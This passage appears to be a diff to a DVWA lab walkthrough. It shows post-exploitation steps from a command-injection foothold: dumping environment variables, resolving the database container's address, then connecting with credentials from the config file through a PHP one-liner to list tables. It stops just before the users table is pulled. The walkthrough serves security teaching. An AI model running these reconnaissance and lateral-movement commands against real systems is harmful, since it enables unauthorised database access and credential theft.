@@ -360,3 +360,127 @@ env
 | `env` |	Lists all environment variables available to this process — since the DVWA config pulls values via getenv(), the real credentials in use (if different from the file’s defaults) would show up here |
 
 </details>
+
+<summary>Click to view full output</summary>
+
+```
+ip a
+bash: ip: command not found
+```
+
+```
+env
+HOSTNAME=fe89249e8052
+PHP_VERSION=8.5.11
+APACHE_CONFDIR=/etc/apache2
+PHP_INI_DIR=/usr/local/etc/php
+GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC 49D9AF6BC72A80D6691719C8AA23F5BE9C7097D4 D95C03BC702BE9515344AE3374E44BC9067701A5
+PHP_LDFLAGS=-Wl,-O1 -pie
+PWD=/var/www/html/vulnerabilities/exec
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+PHP_SHA256=d9be75c08e8c316f4c8f4194d8fbe1750a15f6a6d9d4e3fe72082abeeb800360
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c
+PHP_URL=https://www.php.net/distributions/php-8.5.11.tar.xz
+APACHE_RUN_GROUP=www-data
+APACHE_LOCK_DIR=/var/lock/apache2
+SHLVL=2
+PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_ENVVARS=/etc/apache2/envvars
+DB_SERVER=db
+APACHE_RUN_USER=www-data
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PHP_ASC_URL=https://www.php.net/distributions/php-8.5.11.tar.xz.asc
+PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
+_=/usr/bin/env
+```
+
+</details>
+
+`ip` isn’t installed in this minimal image, but the `env` output gave us something useful: `DB_SERVER=db` — the real database connection is going to a separate container named db (a Docker Compose service), not `127.0.0.1` as the config file’s fallback default suggested. That’s a lateral movement target inside the Docker bridge network.
+
+Let’s find its IP without relying on the `ip` binary:
+
+```
+cat /etc/hosts
+```
+
+```
+getent hosts db
+```
+
+<details> <summary>Command explained</summary>
+  
+| Part | What it does |
+|---|---|
+| `cat /etc/hosts` |	Docker often auto-populates this file with container name-to-IP mappings for linked services |
+| `getent hosts db` |	Resolves the hostname db via the system’s name resolution — works even if Docker uses internal DNS instead of /etc/hosts entries |
+
+</details>
+
+<summary>Click to view full output</summary>
+
+```
+cat /etc/hosts
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::  ip6-localnet
+ff00::  ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.19.0.3      fe89249e8052
+```
+
+```
+getent hosts db
+172.19.0.2      db
+```
+
+</details>
+
+Good — `db` resolves to 172.19.0.2. Let’s check if a MySQL client is available to connect directly with the creds we found:
+
+```
+which mysql
+```
+
+<details> <summary>Command explained</summary>
+  
+| Part | What it does |
+|---|---|
+| `which mysql` |	finds and displays the absolute path of the mysql executable in your current terminal environment |
+
+</details>
+
+No output for me. We can still connect using PHP itself, since this container already has mysqli installed (DVWA requires it) — the web server is effectively its own database client:
+
+```
+php -r '$c = new mysqli("172.19.0.2", "dvwa", "p@ssw0rd", "dvwa"); if ($c->connect_error) { die("Connection failed: " . $c->connect_error); } $r = $c->query("SHOW TABLES"); while ($row = $r->fetch_row()) { echo $row[0] . "\n"; }'
+```
+
+<details> <summary>Command explained</summary>
+  
+| Part | What it does |
+|---|---|
+| `php -r '...'` |	Runs the quoted string as inline PHP code |
+| `php -r '...'` |	Connects directly to the db container’s MySQL service using the credentials found in the config file, targeting the dvwa database |
+| `php -r '...'` |	Lists every table in the database once connected |
+
+</details>
+
+<summary>Click to view full output</summary>
+
+```
+access_log
+guestbook
+security_log
+users
+```
+
+</details>
+
+Connected successfully. The users table is the interesting one — let’s pull it:
+
+```
